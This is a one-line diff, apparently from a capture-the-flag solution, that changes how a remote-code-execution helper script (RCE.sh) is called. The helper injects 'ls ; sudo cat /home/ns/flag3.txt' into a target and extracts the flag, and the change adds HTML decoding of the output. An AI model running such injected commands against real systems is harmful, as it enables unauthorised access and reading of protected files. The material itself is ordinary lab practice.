@@ -1,1 +1,1 @@
-./RCE.sh $1 "ls ; sudo cat /home/ns/flag3.txt" $2 | grep -o 'flag3{.*}'
+./RCE.sh $1 "ls ; sudo cat /home/ns/flag3.txt" $2 | grep -o 'flag3{.*}' | recode html
